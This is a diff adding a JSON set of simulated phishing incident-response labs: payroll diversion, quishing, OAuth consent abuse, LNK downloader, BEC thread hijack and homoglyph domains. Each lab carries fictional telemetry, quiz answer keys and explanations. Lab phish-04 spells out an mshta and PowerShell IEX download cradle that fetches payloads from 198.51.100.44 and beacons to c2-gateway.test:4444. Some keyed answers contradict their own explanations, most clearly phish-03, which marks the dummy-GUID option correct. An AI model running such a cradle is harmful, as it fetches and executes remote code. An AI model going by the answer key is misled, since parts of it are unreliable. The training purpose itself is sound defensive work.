@@ -1,0 +1,253 @@
+{
+  "category": "Phishing",
+  "labs": [
+    {
+      "id": "phish-01",
+      "lab_type": "phishing",
+      "title": "Payroll Diversion Phishing",
+      "category": "Phishing",
+      "difficulty": "Beginner",
+      "estimated_minutes": 10,
+      "mitre_attack": ["T1566.002 Phishing: Spearphishing Link", "T1534 Internal Spearphishing"],
+      "learning_objectives": [
+        "Read SPF, DKIM and DMARC authentication results in an email header",
+        "Recognize lookalike sender domains used in payroll-diversion lures",
+        "Contain a credential-harvesting campaign at the mail gateway"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). An employee received an urgent email claiming payroll details changed. Analyze the email headers and body to identify the social-engineering indicators.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT A REAL EMAIL ===\n=== EMAIL HEADER DUMP ===\nReturn-Path: <payroll@payroll-update.contoso-hr.example>\nReceived: from mx.payroll-update.contoso-hr.example (203.0.113.47)\nAuthentication-Results:\n  spf=fail (domain of contoso.example does not designate 203.0.113.47)\n  dkim=none (no signature found)\n  dmarc=fail (spf fail + dkim none)\nSubject: URGENT: Payroll account update required within 24 hours\nFrom: \"Contoso Payroll Operations\" <payroll@payroll-update.contoso-hr.example>\n=== BODY ===\nDear Employee,\nOur payroll system has detected a failed direct-deposit transfer.\nYou MUST update your bank details within 24 HOURS or your salary\nwill be suspended. Click here: http://payroll-update.contoso-hr.example/update\nThis is an automated message. Do not reply.",
+      "iocs": ["payroll-update.contoso-hr.example", "203.0.113.47", "spf=fail", "dkim=none"],
+      "mitre_tactics": ["TA0001 Initial Access", "TA0002 Execution"],
+      "questions": [
+        {
+          "question": "What is the PRIMARY indicator that this email is a credential-harvesting / payroll-diversion phishing attempt?",
+          "options": [
+            "The display name 'Contoso Payroll Operations' uses a lookalike domain to bypass sender authentication controls",
+            "SPF=fail proves the sending IP 203.0.113.47 is unauthorized per contoso.example DNS policy",
+            "The 24-hour artificial deadline pressures the recipient into bypassing normal security scrutiny",
+            "A generic greeting alone doesn't indicate phishing; domain auth results and SPF are the real indicators"
+          ],
+          "correct_index": 2,
+          "hints": [
+            "Inspect the Return-Path domain carefully — is it actually contoso.example?",
+            "Check the Authentication-Results block: what do SPF and DKIM failures mean?",
+            "Notice the artificial 24-hour deadline — urgency is a classic payroll-diversion lever."
+          ],
+          "explanation": "NIST SP 800-61r2 / SANS PICERL — Identification: SPF=fail proves the sending IP 203.0.113.47 is not authorized by contoso.example's DNS; DKIM=none means no cryptographic signature exists. The domain payroll-update.contoso-hr.example is a lookalike exploiting brand trust. The 24-hour deadline creates artificial urgency to bypass rational scrutiny. Containment: quarantine the message, block the domain and sending IP 203.0.113.47 at the SEG, purge any matching messages enterprise-wide. Recovery: verify payroll channels via out-of-band call."
+        }
+      ]
+    },
+    {
+      "id": "phish-02",
+      "lab_type": "phishing",
+      "title": "Quishing — QR Code Phishing Bypassing SEGs",
+      "category": "Phishing",
+      "difficulty": "Intermediate",
+      "estimated_minutes": 12,
+      "mitre_attack": ["T1566.002 Phishing: Spearphishing Link", "T1204 User Execution"],
+      "learning_objectives": [
+        "Understand why image-embedded QR URLs evade Secure Email Gateway link scanning",
+        "Map the quishing kill chain from inbox to personal mobile device",
+        "Select phishing-resistant MFA that neutralizes stolen credentials"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). A finance user reported an email containing a QR code claiming to be from Microsoft 365 asking to re-verify MFA. The Secure Email Gateway passed it clean.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT A REAL EMAIL ===\n=== EMAIL ===\nSubject: Microsoft 365: MFA enrollment expiring — scan QR to verify\nFrom: \"Contoso Security Team\" <noreply@m365-verify.contoso-security.example>\nAttachments: QR_Reset.png (image/png, 42KB)\nText body: 'Your MFA method expires today. Scan the QR code with your phone camera.'\n=== SEG SCAN LOG ===\nURL Rewriting: no URLs found in body (0 links)\nAttachment sandbox: PNG — clean (no macros, no scripts)\n=== POST-CLICK TELEMETRY ===\nUser scanned QR -> phone opened https://m365-verify.contoso-security.example/login\nPage mimics Microsoft 365 sign-in; steals credentials + session cookie",
+      "iocs": ["m365-verify.contoso-security.example", "QR_Reset.png", "noreply@m365-verify.contoso-security.example"],
+      "mitre_tactics": ["TA0001 Initial Access", "TA0006 Credential Access"],
+      "questions": [
+        {
+          "question": "Why did the Secure Email Gateway (SEG) fail to block this attack, and what is the core risk?",
+          "options": [
+            "The SEG lacked OCR capability to parse QR code images, treating the attachment as benign image-only content",
+            "Many Secure Email Gateways cannot inspect URLs embedded in QR code images, so this can evade URL scanning and link rewriting",
+            "The PNG sandbox rated the attachment clean, so the gateway classified the entire message as low risk and released it to the user",
+            "No plain-text alternative part prevented heuristic content rules from matching known phishing template patterns"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "Look at the SEG scan log: how many URLs were detected in the body?",
+            "A QR code is an image — can the SEG parse what it encodes?",
+            "Where does the payload detonate? Consider the mobile device surface."
+          ],
+          "explanation": "NIST SP 800-61r2 / SANS PICERL — Identification: Quishing moves the kill chain off the email gateway by embedding the malicious URL inside a QR image; many Secure Email Gateways cannot inspect URLs embedded in QR code images, so URL reputation and link-rewriting engines see zero links. The pivot to a personal mobile device escapes corporate proxy and DNS controls. Detection: OCR-scan QR attachments in the mail flow, flag image-only emails with urgency language. Containment: block m365-verify.contoso-security.example, reset the user's credentials and revoke refresh tokens. Lessons Learned: enforce number-matching or FIDO2 phishing-resistant MFA to neutralize credential theft."
+        }
+      ]
+    },
+    {
+      "id": "phish-03",
+      "lab_type": "phishing",
+      "title": "Illicit OAuth 2.0 Consent Grant Abuse",
+      "category": "Phishing",
+      "difficulty": "Advanced",
+      "estimated_minutes": 15,
+      "mitre_attack": ["T1528 Steal Application Access Token", "T1098 Account Manipulation"],
+      "learning_objectives": [
+        "Distinguish OAuth consent-grant phishing from credential phishing",
+        "Interpret Entra ID app registration and consent telemetry",
+        "Revoke illicit grants and harden tenant consent workflows"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). A user clicked a 'Read document' link and was prompted to authorize an app. Review the OAuth consent request and the application registration details.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n=== OAUTH CONSENT PROMPT ===\nApp name: 'DocuSign Secure Viewer' (unverified publisher)\nPublisher: NOT VERIFIED — domain: untrusted-host.example\nPermissions requested:\n  Mail.ReadWrite    — read and modify all mailboxes\n  Offline_Access    — persist access without re-auth\n  User.Read         — basic profile\n=== APP REGISTRATION (Entra ID) ===\nAppId: 00000000-0000-0000-0000-000000000000\nRedirect URI: https://untrusted-host.example/callback\n=== POST-GRANT ACTIVITY (10 min later) ===\nGraph API: GET /me/messages (200 OK, 1,240 messages enumerated)\nGraph API: POST /me/sendMail — BEC email forwarded to finance-team@contoso.example",
+      "iocs": ["00000000-0000-0000-0000-000000000000", "untrusted-host.example", "Mail.ReadWrite", "Offline_Access"],
+      "mitre_tactics": ["TA0001 Initial Access", "TA0003 Persistence", "TA0006 Credential Access"],
+      "questions": [
+        {
+          "question": "What makes this OAuth consent phishing campaign particularly dangerous compared to credential phishing?",
+          "options": [
+            "Mail.ReadWrite scope grants read/write access to all mailboxes without needing credentials, enabling full mailbox compromise",
+            "Offline_Access issues a refresh token that persists through password resets and MFA changes, enabling long-term access",
+            "The attacker registered the app with dummy GUID 00000000-0000-0000-0000-000000000000 to abuse tenant consent flows",
+            "The app name imitates a well-known vendor to confuse users during the Entra ID consent prompt, increasing click-through rates"
+          ],
+          "correct_index": 2,
+          "hints": [
+            "List the exact scopes requested — what can Mail.ReadWrite do?",
+            "What does Offline_Access allow the attacker to persist?",
+            "Does MFA protect API token access once consent is granted?"
+          ],
+          "explanation": "NIST SP 800-61r2 / SANS PICERL — Identification: Illicit consent grants weaponize OAuth as a persistence mechanism. Mail.ReadWrite allows full mailbox read/write; Offline_Access issues a refresh token that survives password resets. Because the user authenticates via legitimate Microsoft identity flows, MFA is satisfied by the victim — the attacker rides the token. Containment: revoke the grant in Entra ID (Enterprise Applications > Consent & permissions > Revoke), disable the AppId 00000000-0000-0000-0000-000000000000, block untrusted-host.example. Prevention: restrict tenant consent to verified publishers, block unverified apps, and audit grants with Microsoft Cloud App Security."
+        }
+      ]
+    },
+    {
+      "id": "phish-04",
+      "lab_type": "phishing",
+      "title": "Malicious Invoice LNK Staging PowerShell Downloader",
+      "category": "Phishing",
+      "difficulty": "Intermediate",
+      "estimated_minutes": 14,
+      "mitre_attack": ["T1204.002 User Execution: Malicious File", "T1059.001 Command and Scripting Interpreter: PowerShell", "T1071.001 Application Layer Protocol: Web Protocols"],
+      "learning_objectives": [
+        "Trace a LNK attachment kill chain across Sysmon process and network events",
+        "Identify living-off-the-land binaries (mshta, powershell) in telemetry",
+        "Isolate a beaconing host and hunt fleet-wide by JA3 fingerprint"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). An accounts-payable user opened an invoice attachment. The attachment was a shortcut (.lnk) file. Analyze the telemetry captured by the endpoint agent.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n=== ATTACHMENT ===\nInvoice_Q4_2025.lnk (ShellLink, 4KB) — icon spoofed as PDF\n=== SYSPMON EVENT ID 1 (Process Create) ===\nImage: C:\\Windows\\System32\\cmd.exe\nCommandLine: cmd.exe /c start mshta.exe \"http://198.51.100.44/update.hta\" & del Invoice_Q4_2025.lnk\nParentImage: C:\\Windows\\explorer.exe\n=== NETWORK (Event ID 3) ===\nmshta.exe -> 198.51.100.44:80 (GET /update.hta) 200 OK\nupdate.hta spawns: powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.44/payload.ps1')\npayload.ps1 -> c2-gateway.test:4444 (TLS beacon, JA3 match: CobaltStrike)",
+      "iocs": ["Invoice_Q4_2025.lnk", "198.51.100.44", "c2-gateway.test:4444", "update.hta", "CobaltStrike JA3"],
+      "mitre_tactics": ["TA0001 Initial Access", "TA0002 Execution", "TA0011 Command & Control"],
+      "questions": [
+        {
+          "question": "What is the correct detection conclusion and immediate containment for this LNK-based attack?",
+          "options": [
+            "The .lnk masqueraded as a PDF and chained cmd -> mshta -> powershell to fetch and run a remote payload; isolate the host",
+            "A PDF reader vulnerability was exploited through the spoofed icon, so patching Adobe Acrobat across the entire fleet is the priority containment step now",
+            "The user downloaded a legitimate invoice from a known vendor, so no containment or further triage is needed at this time by the SOC",
+            "Windows Defender failed because the LNK attachment was encrypted with a simple XOR scheme before delivery to the endpoint"
+          ],
+          "correct_index": 0,
+          "hints": [
+            "What file type is the attachment really, and what icon does it spoof?",
+            "Trace the process chain: cmd.exe -> which LOLBin -> which interpreter?",
+            "Check the final network connection: what does the JA3 match indicate?"
+          ],
+          "explanation": "NIST SP 800-61r2 / SANS PICERL — Identification: The .lnk abuses ShellLink execution and icon spoofing to appear as a PDF. The kill chain uses living-off-the-land binaries: cmd.exe -> mshta.exe (HTML Application) -> powershell.exe download cradle -> TLS beacon with a CobaltStrike JA3 fingerprint. Detection: Sysmon EID 1 CommandLine + EID 3 destination, plus JA3/SIGMA rules on unmanaged mshta/powershell downloaders. Containment: network-isolate the endpoint, block 198.51.100.44 and c2-gateway.test at the egress proxy, kill the beacon process, capture memory for forensics. Recovery: reimage or perform full AV/EDR sweep; hunt for matching JA3 across the fleet."
+        }
+      ]
+    },
+    {
+      "id": "phish-05",
+      "lab_type": "phishing",
+      "title": "BEC Thread Hijack via ComproMailbox",
+      "category": "Phishing",
+      "difficulty": "Intermediate",
+      "estimated_minutes": 14,
+      "mitre_attack": ["T1114 Email Collection", "T1656 Impersonation", "T1534 Internal Spearphishing"],
+      "learning_objectives": [
+        "Detect thread-hijacking BEC inside a compromised internal mailbox",
+        "Compare display-name vs envelope-from vs reply-to addresses",
+        "Respond to wire-fraud attempts with verification and payment controls"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). Finance received a reply inside a real, months-old vendor thread asking to update bank details. The reply looked legitimate because the thread was genuine. Review the message and mailbox audit trail.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n=== SUSPICIOUS REPLY (inside real thread 'Q3 hardware order #4471') ===\nFrom: \"Northwind Supplies Ltd\" <northwind.billing@mail-nw-supplies.example>\nReply-To: billing@nw-supplies-invoices.example\nBody: 'Please note our bank details have changed. Kindly route outstanding\ninvoice #4471 payments to the new IBAN below before Friday.'\nIBAN: LT00 0000 0000 0000 0000 (SIMULATED dummy value)\n=== MAILBOX AUDIT (sender = vendor employee 'k.osei') ===\nSignInLogs: k.osei authenticated from 203.0.113.201 (not usual country)\nMailbox access via IMAP from 203.0.113.201 — 3 sessions in 2 days\nMessage moved: Sent -> Deleted Items (draft BEC reply restored later)\nMailbox rule created: 'move mail containing \"invoice\" to RSS Feeds'",
+      "iocs": ["mail-nw-supplies.example", "nw-supplies-invoices.example", "203.0.113.201", "hidden mailbox rule 'RSS Feeds'"],
+      "mitre_tactics": ["TA0001 Initial Access", "TA0009 Collection", "TA0010 Exfiltration"],
+      "questions": [
+        {
+          "question": "Which single artifact in the mailbox audit trail is the strongest indicator of an account-takeover BEC operation (rather than an external spoof)?",
+          "options": [
+            "The reply-to domain nw-supplies-invoices.example differs from the envelope sender domain",
+            "A hidden mailbox rule that auto-hides replies containing 'invoice', combined with IMAP logins from an unusual country",
+            "The dummy IBAN in the message body, because attackers always use Lithuanian accounts",
+            "The original thread 'Q3 hardware order #4471' was months old, which proves the sender's mailbox was always compromised"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "Who actually sent this message — an outsider, or the vendor's own mailbox?",
+            "Why would an attacker create a rule that moves 'invoice' mail to an obscure folder?",
+            "Combine the IMAP login country anomaly with the rule: what does that imply?"
+          ],
+          "explanation": "The message is a thread hijack sent FROM the vendor's real mailbox after an IMAP account takeover (login from 203.0.113.201, unusual country). Attackers create stealth mailbox rules (move replies to RSS Feeds / Deleted Items) so the victim employee never sees the bank's or customer's responses. A mismatched Reply-To is suspicious but also occurs in spoof-only BEC; the internal mailbox rule plus foreign IMAP access proves account takeover. Response: revoke the vendor account sessions, rotate credentials, remove the rule, alert the vendor, freeze the payment pending out-of-band verification by phone, and review all invoice threads for tampering."
+        },
+        {
+          "question": "What is the MOST effective preventive control against this wire-diversion pattern for the paying organization?",
+          "options": [
+            "Block all emails whose display name contains a vendor name",
+            "Out-of-band callback verification of bank-detail changes using previously known contact numbers, plus dual approval for payment-account changes",
+            "Deploy DMARC enforcement for your own domain, which stops the vendor's mailbox compromise",
+            "Force password resets for all finance staff every 30 days"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "The core fraud primitive is a bank-detail change — who must confirm it?",
+            "Which control works even when the vendor's mailbox is fully compromised?",
+            "Think verification of the PAYMENT instruction, not just email authentication."
+          ],
+          "explanation": "Bank-detail changes are the heart of vendor-email-compromise fraud. The control that works even when the vendor mailbox is legitimately compromised is out-of-band verification (calling a previously known phone number, never one from the email) plus dual approval for any payment-account change. DMARC protects YOUR domain's spoofing but not a vendor's compromised mailbox; display-name blocking is trivially bypassed; frequent password resets do not address vendor-side takeover and can weaken security through fatigue."
+        }
+      ]
+    },
+    {
+      "id": "phish-06",
+      "lab_type": "phishing",
+      "title": "Homoglyph Domain Spearphish Targeting HR",
+      "category": "Phishing",
+      "difficulty": "Beginner",
+      "estimated_minutes": 8,
+      "mitre_attack": ["T1566.002 Phishing: Spearphishing Link", "T1566.003 Phishing: Spearphishing via Service"],
+      "learning_objectives": [
+        "Spot punycode/homoglyph lookalike domains (cyrillic characters)",
+        "Understand why SPF/DKIM can pass on attacker-owned lookalike domains",
+        "Configure detection for identity-confusable domains at the SEG"
+      ],
+      "scenario": "SIMULATED TRAINING EXAMPLE (fictional). An HR employee received a 'confidential salary review' document link. The sender domain looked perfectly identical to the company's internal HR portal at a glance.",
+      "telemetry": "=== SIMULATED TRAINING EXAMPLE - NOT A REAL EMAIL ===\n=== EMAIL ===\nFrom: \"Contoso HR Portal\" <no-reply@cοntoso-hr.example>\nSubject: Salary review document — action needed\nLink: https://cοntoso-hr.example/salary-review?id=8842\n=== HEADER AUTH RESULTS ===\nspf=pass (domain cοntoso-hr.example designates 192.0.2.130)\ndkim=pass (signature verified for d=cοntoso-hr.example)\ndmarc=pass (alignment: cοntoso-hr.example)\n=== DOMAIN ANALYSIS ===\nUnicode form: c\u03bfntoso-hr.example  ('o' is U+03BF GREEK SMALL LETTER OMICRON)\nPunycode form: xn--cntoso-hr-9nd.example\nRegistered: 3 days ago via privacy proxy\n=== USER REPORT ===\nHR analyst entered corporate credentials on the linked page (55 minutes ago)",
+      "iocs": ["xn--cntoso-hr-9nd.example", "U+03BF omicron homoglyph", "192.0.2.130"],
+      "mitre_tactics": ["TA0001 Initial Access", "TA0006 Credential Access"],
+      "questions": [
+        {
+          "question": "SPF, DKIM and DMARC all PASSED for this message. Why is it still a malicious phish?",
+          "options": [
+            "The SEG mis-parsed the DMARC alignment because the message had no DKIM signature",
+            "Authentication validates the SENDER'S OWN domain — the attacker registered and properly authenticated a lookalike domain with a homoglyph 'o'",
+            "DMARC can never pass on messages that contain links to credential-capture pages",
+            "The authentication results are forged; no real mail server would report spf=pass for an external IP"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "Compare the Unicode and punycode forms of the domain in the analysis block.",
+            "Who controls the DNS of cοntoso-hr.example (omicron)?",
+            "SPF/DKIM/DMARC prove the mail came FROM the domain it claims — is that domain your company's?"
+          ],
+          "explanation": "Email authentication proves a message genuinely came from the domain it claims — nothing more. The attacker registered the lookalike cοntoso-hr.example (Greek omicron instead of 'o'), published proper SPF/DKIM records, so authentication legitimately passes for THEIR domain. This is why authentication must be paired with identity-confusable domain detection (IDN/homoglyph checks), newly-registered-domain reputation, and brand-lookalike blocking at the SEG. Response: reset the HR analyst's credentials, revoke sessions, block the punycode domain and 192.0.2.130, hunt for other recipients."
+        },
+        {
+          "question": "The analyst already entered credentials on the linked page. What is the FIRST containment action?",
+          "options": [
+            "Email the attacker's domain asking them to delete the captured credentials",
+            "Reset the analyst's password and revoke all active sessions/tokens, then hunt for follow-on access",
+            "Wait 24 hours to see if the account shows anomalous logins before acting",
+            "Block only the phishing URL at the web proxy — credential rotation is unnecessary if the page is unreachable"
+          ],
+          "correct_index": 1,
+          "hints": [
+            "The credentials are already compromised — time matters more than the page itself.",
+            "What survives a password reset? (think refresh tokens, active sessions)",
+            "Blocking the URL helps others, but does nothing for the already-stolen secret."
+          ],
+          "explanation": "Once credentials are submitted to an attacker-controlled page, they must be considered compromised. Immediate password reset plus revocation of all sessions/refresh tokens (and MFA re-registration check) cuts off access before the attacker can use them or abuse stolen session cookies. URL blocking is useful to protect other users but does nothing about the stolen credential. Hunting for follow-on access (new mailbox rules, forwarding, OAuth grants) comes immediately after containment."
+        }
+      ]
+    }
+  ]
+}
